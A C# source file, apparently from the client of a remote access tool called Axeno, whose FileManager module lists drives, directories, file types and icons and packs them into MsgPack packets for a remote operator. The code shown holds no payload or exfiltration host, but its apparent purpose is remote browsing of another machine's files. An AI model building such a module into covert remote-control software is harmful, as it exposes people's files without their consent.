using Axeno.Client.MessagePack;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Axeno.Client.Networking.Functions.System
{
    internal class FileManager
    {
        public static byte[] GetDrives()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            StringBuilder sb = new StringBuilder();
            string drSize = "N/A";

            foreach (DriveInfo drive in allDrives)
            {
                if (drive.IsReady)
                {
                    long driveSizeBytes = drive.TotalSize;
                    double driveSizeTB = driveSizeBytes / (1024.0 * 1024.0 * 1024.0 * 1024.0);
                    double driveSizeGB = driveSizeBytes / (1024.0 * 1024.0 * 1024.0);
                    double driveSizeMB = driveSizeBytes / (1024.0 * 1024.0);
                    double driveSizeKB = driveSizeBytes / 1024.0;

                    if (driveSizeTB >= 1.0)
                    {
                        drSize = $"{driveSizeTB:0.##} TB";
                    }
                    else if (driveSizeGB >= 1.0)
                    {
                        drSize = $"{driveSizeGB:0.##} GB";
                    }
                    else if (driveSizeMB >= 1.0)
                    {
                        drSize = $"{driveSizeMB:0.##} MB";
                    }
                    else if (driveSizeKB >= 1.0)
                    {
                        drSize = $"{driveSizeKB:0.##} KB";
                    }
                    else
                    {
                        drSize = $"{driveSizeBytes} bytes";
                    }

                }

                sb.Append($"Name<{drive.Name}>Type<Drive>Access<{drive.RootDirectory.LastAccessTime}>Size<{drSize}>Path<{drive.RootDirectory.FullName}>Icon<DRIVE><SPLITHERE>");
            }

            MsgPack mpack = new MsgPack();
            mpack.ForcePathObject("Packet").AsString = "FileManager";
            mpack.ForcePathObject("Data").AsString = sb.ToString();
            return mpack.Encode2Bytes();

        }
        public static byte[] GetDirectory(string directoryPath)
        {
            DirectoryInfo directory = new DirectoryInfo(directoryPath);
            StringBuilder sb = new StringBuilder();
            string parentDir = "";
            int fCount = 0;
            int dirCount = 0;

            try
            {
                if (directory != null && directory.Parent != null)
                {
                    parentDir = directory.Parent.FullName;
                }

                if (parentDir == null)
                {
                    parentDir = "";
                }
            }
            catch (Exception)
            {
                parentDir = "";
            }
            foreach (FileInfo file in directory.GetFiles())
            {
                fCount++;

                long fSize = file.Length;
                string fSizeStr = "";
                double fileSizeTB = fSize / (1024.0 * 1024.0 * 1024.0 * 1024.0);
                double fileSizeGB = fSize / (1024.0 * 1024.0 * 1024.0);
                double fileSizeMB = fSize / (1024.0 * 1024.0);
                double fileSizeBytes = fSize / 1024.0;

                if (fileSizeTB >= 1.0)
                {
                    fSizeStr = $"{fileSizeTB:0.##} TB";
                }
                else if (fileSizeGB >= 1.0)
                {
                    fSizeStr = $"{fileSizeGB:0.##} GB";
                }
                else if (fileSizeMB >= 1.0)
                {
                    fSizeStr = $"{fileSizeMB:0.##} MB";
                }
                else if (fileSizeBytes >= 1.0)
                {
                    fSizeStr = $"{fileSizeBytes:0.##} KB";
                }
                else
                {
                    fSizeStr = $"{fSize} bytes";
                }
                try
                {
                    NativeMethodsFileMGR.SHFILEINFO info = new NativeMethodsFileMGR.SHFILEINFO();

                    string fileName = file.FullName;
                    uint dwFileAttributes = NativeMethodsFileMGR.FILE_ATTRIBUTE.FILE_ATTRIBUTE_NORMAL;
                    uint uFlags = (uint)(NativeMethodsFileMGR.SHGFI.SHGFI_ICON | NativeMethodsFileMGR.SHGFI.SHGFI_TYPENAME | NativeMethodsFileMGR.SHGFI.SHGFI_USEFILEATTRIBUTES);

                    NativeMethodsFileMGR.SHGetFileInfo(fileName, dwFileAttributes, ref info, (uint)Marshal.SizeOf(info), uFlags);
                    string fType = info.szTypeName;
                    Icon fIcon = Icon.FromHandle(info.hIcon);

                    sb.Append($"Name<{file.Name}>Type<{fType}>Access<{file.LastAccessTime}>Size<{fSizeStr}>Path<{file.FullName}>Parent<{parentDir}>Icon<{Convert.ToBase64String(ImageToByteArray(fIcon.ToBitmap()))}><SPLITHERE>");
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"An error occurred: {ex.Message}");
                }
            }


            foreach (DirectoryInfo subDir in directory.GetDirectories())
            {
                dirCount++;

                sb.Append($"Name<{subDir.Name}>Type<Folder>Access<{directory.LastAccessTime}>Path<{subDir.FullName}>Parent<{parentDir}>Icon<FOLDER><SPLITHERE>");
            }
            if(dirCount == 0 && fCount == 0)
            {
                sb.Append($"(EMPTYFOLDER)<SPLITHERE><SPLITHERE>");

            }

            //if(sb.Length <= 0)
            //{
            //    sb.Append("(EMPTYFOLDER)<SPLITHERE><SPLITHERE>");
            //}

            MsgPack mpack = new MsgPack();
            mpack.ForcePathObject("Packet").AsString = "FileManager";
            mpack.ForcePathObject("Data").AsString = sb.ToString();
            return mpack.Encode2Bytes();
        }
        public static byte[] ImageToByteArray(Image image)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                image.Save(ms, ImageFormat.Png);
                return ms.ToArray();
            }
        }
    }


    static class NativeMethodsFileMGR
    {
        public const uint SHGFI_ICON = 0x100;

        [StructLayout(LayoutKind.Sequential)]
        public struct SHFILEINFO
        {
            public IntPtr hIcon;
            public int iIcon;
            public uint dwAttributes;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szDisplayName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
            public string szTypeName;
        };

        public static class FILE_ATTRIBUTE
        {
            public const uint FILE_ATTRIBUTE_NORMAL = 0x80;
        }

        public static class SHGFI
        {
            public const uint SHGFI_TYPENAME = 0x000000400;
            public const uint SHGFI_USEFILEATTRIBUTES = 0x000000010;
            public const uint SHGFI_ICON = 0x100;

        }

        [DllImport("shell32.dll")]
        public static extern IntPtr SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi, uint cbSizeFileInfo, uint uFlags);
    }

}
